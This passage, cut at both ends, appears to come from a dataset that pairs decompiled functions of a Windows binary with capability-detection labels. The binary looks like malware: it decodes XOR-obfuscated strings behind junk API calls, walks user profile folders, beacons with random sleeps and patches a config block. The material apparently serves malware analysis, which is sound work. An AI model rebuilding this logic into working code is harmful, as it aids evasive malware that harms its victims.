code_r0x0040c9c5;\n                    }\n                    cVar2 = *pcVar7;\n                    pcVar5 = pcVar7;\n                    while (cVar2 != '.') {\n                        if (cVar2 == '\\0') goto code_r0x0040c98f;\n                        pcVar5 = pcVar5 + 1;\n                        cVar2 = *pcVar5;\n                    }\n                    *pcVar5 = '\\0';\n                    iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX);\n                    if (iVar4 == 0) goto code_r0x0040c9a4;\ncode_r0x0040c98f:\n                    puVar8 = puVar8 + 0x48;\n                    var_8h = var_8h + 1;\n                } while (var_8h < *puVar3);\n                uVar6 = 2;\n            }\n            goto code_r0x0040c9c5;\n        }\n    }\n    uVar6 = 8;\ncode_r0x0040c9c5:\n    if (puVar3 != NULL) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n    }\n    return uVar6;\n}\n",
        "token_count": 835
    },
    "0040d404": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040d404(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint lpFindFileData;\n    uint psz1;\n    int32_t var_78h;\n    int32_t var_74h;\n    int32_t lpMem;\n    uint lpcchSize;\n    int32_t var_68h;\n    uint ARG_0;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint lpFileName;\n    uint lpProfileDir;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar var_10h;\n    uint var_fh;\n    uint var_bh;\n    uint var_7h;\n    uint var_3h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpProfileDir = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    uVar2 = (*pcVar1)(8, 0x208);\n    lpFileName = (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(8, 0x208);\n    ARG_0 = (*pcVar5)(uVar2);\n    lpcchSize = 0x104;\n    var_28h = 0x55034d25;\n    var_24h = 0x4d084e0c;\n    var_20h = 0x4e4f5500;\n    var_1ch = 0x55094d3a;\n    var_18h = 0x4d1d4e1b;\n    var_60h = 5;\n    var_14h = 0x4e015505;\n    _var_10h = 0x551f4d0e;\n    stack0xfffffff0 = 0x4d3d4e33;\n    stack0xfffffff4 = 0x4e025509;\n    var_7h._3_1_ = 0x19;\n    var_3h._0_1_ = 0x4d;\n    var_3h._1_1_ = 0x6c;\n    var_3h._2_1_ = 0x55;\n    var_30h = 0x556c4d69;\n    var_2ch._0_2_ = 0x4e6f;\n    uVar2 = (*pcVar1)(8, 0x51);\n    iVar3 = (*pcVar5)(uVar2);\n    var_54h = 6;\n    iVar6 = 0;\n    var_68h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar4 != 0xb478a5) {\n            *(iVar6 + iVar3) = *(&var_30h + iVar6 % var_54h) ^ (iVar6 + iVar3)[&var_28h - iVar3];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x28);\n    var_28h = 0x4b3c4479;\n    var_24h = 0x447c4545;\n    var_20h = 0x45414b2d;\n    var_1ch = 0x4b104459;\n    var_18h = 0x44574579;\n    var_14h = 0x45544b2f;\n    _var_10h = 0x4b104454;\n    stack0xfffffff0 = 0x445d4561;\n    stack0xfffffff4 = 0x45454b21;\n    var_7h._3_1_ = 0x38;\n    var_3h._0_1_ = 0x44;\n    var_30h = 0x4b4c4438;\n    var_2ch._0_2_ = 0x4535;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n    var_78h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = 0;\n    lpMem = var_78h;\n    var_3ch = &var_28h - var_78h;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        uVar2 = lpProfileDir;\n        if (iVar6 != 0x70b5e6) {\n            *(iVar3 + var_78h) = *(&var_30h + iVar3 % var_54h) ^ (iVar3 + var_78h)[&var_28h - var_78h];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x26);\n    var_74h = var_68h;\n    iVar3 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar3 != 0) {\n        (*_sym.imp.USER32.dll_wsprintfW)(lpFileName, L\"%s\\\\*\", uVar2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n        var_3ch = iVar3;\n        while (iVar3 != -1) {\n            iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x4117d4);\n            if ((iVar6 != 0) && (iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x4117d8),  iVar6 != 0)) {\n                var_50h = 0;\n                var_38h = 0x637b742e;\n                var_34h._0_2_ = 0x7269;\n                var_4ch = 0x63517472;\n                var_48h._0_1_ = 0x69;\n                var_30h = 0x387a656a;\n                var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 99);\n                do {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(lpFileName, uVar2);\n                    uVar2 = (*pcVar5)(8, 0xd);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar6 = 0;\n                    var_5ch = iVar3;\n                    var_58h = &var_38h - iVar3;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                        if (iVar4 != 0x30eea2) {\n                            *(iVar6 + iVar3) = *(&var_4ch + iVar6 % var_60h) ^ (iVar6 + iVar3)[&var_38h - iVar3];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 6);\n                    (*_sym.imp.SHLWAPI.dll_StrCatW)(lpFileName, iVar3);\n                    var_14h = 0x3809654f;\n                    _var_10h = 0x7a406a3f;\n                    stack0xfffffff0 = 0x6536634b;\n                    stack0xfffffff4 = 0x6a10385f;\n                    var_7h._3_1_ = 0x65;\n                    var_3h._0_1_ = 0x7a;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar6 = 0;\n                    var_58h = &var_14h - iVar3;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                        if (iVar4 != 0x5df327) {\n                            *(iVar6 + iVar3) = *(&var_30h + iVar6 % var_60h) ^ (iVar6 + iVar3)[&var_14h - iVar3];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0x12);\n                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar3, lpProfileDir, &psz1, (&var_78h)[var_50h]);\n                    fcn.0040ab33(1);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    uVar2 = (*pcVar5)(0, var_5ch);\n                    (*pcVar1)(uVar2);\n                    var_50h = var_50h + 1;\n                    uVar2 = lpProfileDir;\n                    iVar3 = var_3ch;\n                } while (var_50h < 2);\n            }\n            iVar6 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar3, &lpFindFileData);\n            if (iVar6 == 0) {\n                (*_sym.imp.KERNEL32.dll_FindClose)(iVar3);\n                iVar3 = -1;\n                var_3ch = -1;\n            }\n        }\n    }\n    var_24h = 0x75664c64;\n    var_20h = 0x4c326249;\n    var_1ch = 0x62557541;\n    var_18h = 0x75674c2c;\n    var_14h = 0x4c2e625f;\n    _var_10h = 0x62157541;\n    stack0xfffffff0 = 0x75614c1d;\n    stack0xfffffff4 = 0x4c2c6255;\n    var_7h._3_1_ = 0x45;\n    var_3h._0_1_ = 0x75;\n    var_3h._1_1_ = 0x30;\n    var_3h._2_1_ = 0x62;\n    var_38h = 0x75354c41;\n    var_34h._0_2_ = 0x6230;\n    uVar2 = (*pcVar5)(8, 0x49);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_5ch = &var_24h - iVar3;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar4 != 0xc6bd17) {\n            *(iVar6 + iVar3) = *(&var_38h + iVar6 % var_54h) ^ (iVar6 + iVar3)[&var_24h - iVar3];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x24);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar3, lpProfileDir, 0x104);\n    fcn.0040ab33(1);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, ARG_0);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, lpProfileDir);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, lpMem);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, var_68h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return;\n}\n",
        "token_count": 2944
    },
    "0040def3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040def3(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    uint uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = -1;\n    var_8h = *0x41dab0;\n    var_44h = 0x3d570c19;\n    var_40h._0_2_ = 0x817;\n    var_40h._2_1_ = 0x1f;\n    var_4h = 6;\n    var_40h._3_1_ = 6;\n    var_3ch = 0x219335d;\n    var_38h = 0x295b0015;\n    var_34h = 0x1a0b1c03;\n    var_30h = 0x16052f41;\n    var_2ch = 0x741a1401;\n    var_28h = 0x5d4a5f2d;\n    var_24h = 0x59446c00;\n    var_20h = 0x59045740;\n    var_14h = 0x59346e78;\n    var_10h._0_2_ = 0x6e72;\n    var_1ch = param_2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar5 != 0x29afbf) {\n            pcVar4[iVar7] = *(&var_14h + iVar7 % var_4h) ^ (pcVar4 + iVar7)[&var_44h - pcVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x28);\n    iVar7 = 0;\n    pcVar8 = str.DG_X;\n    do {\n        var_14h = 1;\n        var_4h = 0;\n        do {\n            if (pcVar8[iVar7] != '\\0') {\n                cVar2 = *pcVar4;\n                pcVar6 = pcVar4;\n                while (cVar2 != pcVar8[iVar7]) {\n                    if (cVar2 == '\\0') {\n                        bVar1 = false;\n                        goto code_r0x0040dfe6;\n                    }\n                    pcVar6 = pcVar6 + 1;\n                    cVar2 = *pcVar6;\n                }\n            }\n            var_4h = var_4h + 1;\n        } while (var_4h < 0x20);\n        bVar1 = true;\ncode_r0x0040dfe6:\n        if (((*pcVar8 != '\\0') && (pcVar8[0x1f] == '\\0')) && (bVar1)) {\n            iVar5 = fcn.00401a05();\n            if (iVar5 != -1) {\n                *var_1ch = iVar5;\n                var_ch = iVar7;\n                break;\n            }\n            var_8h = var_8h * 0x19660d + 0x3c6ef35f;\n            (*_sym.imp.KERNEL32.dll_Sleep)(var_8h % 600000 + 60000);\n        }\n        pcVar8 = pcVar8 + 0x20;\n        iVar7 = iVar7 + 1;\n    } while (pcVar8 < 0x41da50);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return var_ch;\n}\n",
        "token_count": 1026
    },
    "0040e061": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.0040e061(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint *puVar6;\n    char *pcVar7;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar4 = NULL;\n    puVar6 = &var_ch;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    if (((*in_ECX != 0) && (in_ECX[1] != 0)) && (iVar2 = fcn.00410266(),  -1 < iVar2)) {\n        uVar3 = 0;\n        var_4h = 0x44444444;\n        if (var_ch != 4) {\n            do {\n                iVar2 = 0;\n                while (*(iVar2 + uVar3 + var_8h) == *(&var_4h + iVar2)) {\n                    iVar2 = iVar2 + 1;\n                    if (3 < iVar2) {\n                        pcVar4 = uVar3 + var_8h;\n                        goto code_r0x0040e0ca;\n                    }\n                }\n                uVar3 = uVar3 + 1;\n            } while (uVar3 < var_ch - 4U);\n        }\ncode_r0x0040e0ca:\n        if (pcVar4 != NULL) {\n            pcVar5 = pcVar4;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar5 = '\\0';\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar5 = str.DG_X;\n            pcVar7 = pcVar4;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar7 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n                pcVar7 = pcVar7 + 1;\n            }\n            pcVar5 = pcVar4;\n            for (iVar2 = 0x140; pcVar1 = _sym.imp.KERNEL32.dll_lstrcpyA,  iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar5 = '\\0';\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar5 = str.DG_X;\n            (*_sym.imp.KERNEL32.dll_lstrcpyA)(pcVar4, str.DG_X + arg_8h * 0x20);\n            do {\n                pcVar4 = pcVar4 + 0x20;\n                if (*pcVar5 != '\\0') {\n                    (*pcVar1)(pcVar4, pcVar5);\n                }\n                pcVar5 = pcVar5 + 0x20;\n            } while (pcVar5 < 0x41da30);\n        }\n        fcn.0040f56a();\n        *0x41dd30 = var_ch;\n        pcVar4 = 0x1;\n        *0x41dd34 = var_8h;\n    }\n    return pcVar4;\n}\n",
        "token_count": 764
    },
    "0040e154": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040e21d)\n// WARNING: Removing unreachable block (ram,0x0040e238)\n// WARNING: Removing unreachable block (ram,0x0040e23f)\n// WARNING: Removing unreachable block (ram,0x0040e246)\n// WARNING: Removing unreachable block (ram,0x0040e25f)\n\nuint __cdecl fcn.0040e154(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint32_t uStack420;\n    \n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201);\n    puVar3 = &stack0xfffffe50;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = 0x41dd30;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = fcn.0040f376();\n    if (iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41db24);\n        (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    }\n    cVar1 = fcn.0040feb4();\n    if ((cVar1 != '\\0') && (iVar2 = fcn.0040e061(0),  iVar2 != 0)) {\n        fcn.0040f56a();\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41db24);\n    }\n    while (*0x41ddd8 == 0) {\n        iVar2 = fcn.0040def3();\n        if (iVar2 != -1) {\n            fcn.00401a87();\n        }\n        uStack420 = uStack420 * 0x19660d + 0x3c6ef35f;\n        (*_sym.imp.KERNEL32.dll_Sleep)(uStack420 % 600000 + 60000);\n    }\n    return 0;\n}\n",
        "token_count": 506
    },
    "0040ec49": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040ec49(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint32_t var_48h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    code *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t lpModuleName;\n    uint var_8h;\n    uint var_4h;\n    \n    var_24h = *0x41dd68;\n    puVar8 = &var_48h;\n    for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_4h = 0;\n    var_8h = 0;\n    var_14h = 0;\n    *0x41dd78 = fcn.0040f376();\n    iVar6 = fcn.00401ebc();\n    if (iVar6 == 0) {\n        fcn.004020f5();\n        fcn.00404b59();\n    }\n    while (iVar6 = fcn.004058aa(),  iVar6 != 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.0040b4dd();\n    iVar6 = fcn.0040ef18();\n    if (iVar6 != 0) {\n        if (2 < var_48h >> 8) {\n            iVar6 = 0;\n            iVar7 = (var_48h >> 8 & 0xff) - 2;\n            if (0 < iVar7) {\n                do {\n                    *0x41dab0 = *0x41dab0 + (&var_3ch)[iVar6];\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < iVar7);\n            }\n        }\n        *0x41dab0 = *0x41dab0 ^ 0x43103655;\n        fcn.00401fa0();\n    }\n    pcVar5 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(str.DG_X, 0x184, 0x40, &var_4h);\n    fcn.0040f4e0();\n    (*pcVar5)(str.DG_X, 0x184, var_4h, &var_4h);\n    fcn.0040185a();\n    fcn.0040185a();\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_3ch = 0x14202a1b;\n    var_38h = 0x7d433d36;\n    var_34h = 0x3d3f1e7c;\n    var_30h._0_1_ = 0x70;\n    var_2ch = 0x7a524f70;\n    var_28h._0_2_ = 0x5153;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_10h = 6;\n    iVar7 = 0;\n    var_18h = &var_3ch - iVar6;\n    lpModuleName = iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar3 != 0x3e5189) {\n            *(iVar7 + iVar6) = *(&var_2ch + iVar7 % var_10h) ^ (iVar7 + iVar6)[var_18h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    var_38h = 0xa2e3704;\n    var_34h = 0x1d3e2a36;\n    var_30h._0_1_ = 0x4b;\n    var_2ch = 0x4b4a5345;\n    var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x42);\n    uVar2 = (*pcVar5)(8, 10);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    var_1ch = &var_38h - iVar6;\n    var_20h = iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar3 != 0x7b1605) {\n            var_18h = 5;\n            *(iVar7 + iVar6) = *(&var_2ch + iVar7 % 5) ^ (iVar7 + iVar6)[var_1ch];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 9);\n    var_30h._1_1_ = 6;\n    var_3ch = 0xa153d06;\n    var_38h = 0x35000b3b;\n    var_34h = 0x82e291e;\n    var_30h._0_1_ = 0x2c;\n    var_30h._2_1_ = 0x7a;\n    var_2ch = 0x687a5141;\n    var_28h._0_2_ = 0x675a;\n    uVar2 = (*pcVar5)(8, 0x10);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    var_1ch = &var_3ch - iVar6;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        iVar3 = var_20h;\n        if (iVar4 != 0x699f34) {\n            *(iVar7 + iVar6) = *(&var_2ch + iVar7 % var_10h) ^ (iVar7 + iVar6)[&var_3ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xf);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, var_20h);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    var_20h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar6);\n    pcVar5 = (*pcVar5)(uVar2);\n    (*pcVar5)(*0x41dabc);\n    (*var_20h)(*0x41dabc);\n    iVar7 = fcn.0040a771(&var_14h);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    if (iVar7 == 0) {\n        fcn.0040b474();\n        fcn.0040e944();\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n        (*pcVar5)(uVar2);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, lpModuleName);\n    (*pcVar5)(uVar2);\n    return;\n}\n",
        "token_count": 1839
    },
    "0040f31f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f31f(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if ((param_1 != NULL) && (param_2 != NULL)) {\n        if (param_1[1] != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        uVar2 = (*pcVar1)(8, *param_2);\n        puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        param_1[1] = puVar3;\n        if (puVar3 != NULL) {\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *param_1 = *param_2;\n            puVar3 = param_2[1];\n            puVar5 = param_1[1];\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar5 = puVar5 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 371
    },
    "0040fb76": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040fb76(int32_t *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint ARG_0;\n    uint lpValueName;\n    uint32_t var_58h;\n    int32_t var_54h;\n    int32_t *var_50h;\n    uint32_t var_4ch;\n    int32_t hKey;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_2dh;\n    uint var_29h;\n    uchar var_25h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = var_24h & 0xffffff00;\n    var_50h = param_1;\n    var_ch = param_2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    if ((((uVar2 != 0) && (param_1 != NULL)) && (*param_1 != 0)) && (param_1[1] != 0)) {\n        var_58h = uVar2;\n        fcn.0040f9f1();\n        hKey = fcn.0040f998(0x20006);\n        if (hKey != 0) {\n            var_44h = *param_1;\n            var_40h = 0x7a02542c;\n            var_3ch = 0x542f6c5f;\n            var_38h = 0x6c487a19;\n            var_34h._0_2_ = 0x5407;\n            stack0xffffffcb = 0x296c507a;\n            var_2dh = 0x147a0e54;\n            var_4ch = (((var_44h + 0x7cfffU) / 0x7d000) * 0x7d000) / 0x7d000;\n            puVar7 = &ARG_0;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_29h = 0x6b542a6c;\n            puVar7 = &lpValueName;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_20h = 6;\n            var_34h._2_1_ = 6;\n            var_25h = 0x7a;\n            var_8h = 0x7a6b544e;\n            var_4h._0_2_ = 0x6c31;\n            uVar1 = (*pcVar5)(8, 0x39);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_54h = iVar4;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n                if (iVar3 != 0x72b799) {\n                    *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_20h) ^ (iVar6 + iVar4)[&var_40h - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar4, var_ch);\n            var_ch = 0;\n            var_18h = 0x38326343;\n            var_14h = 0x41466639;\n            var_10h = 0x6366665c;\n            var_8h = 0x38416366;\n            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x66);\n            var_20h = 5;\n            pcVar5 = 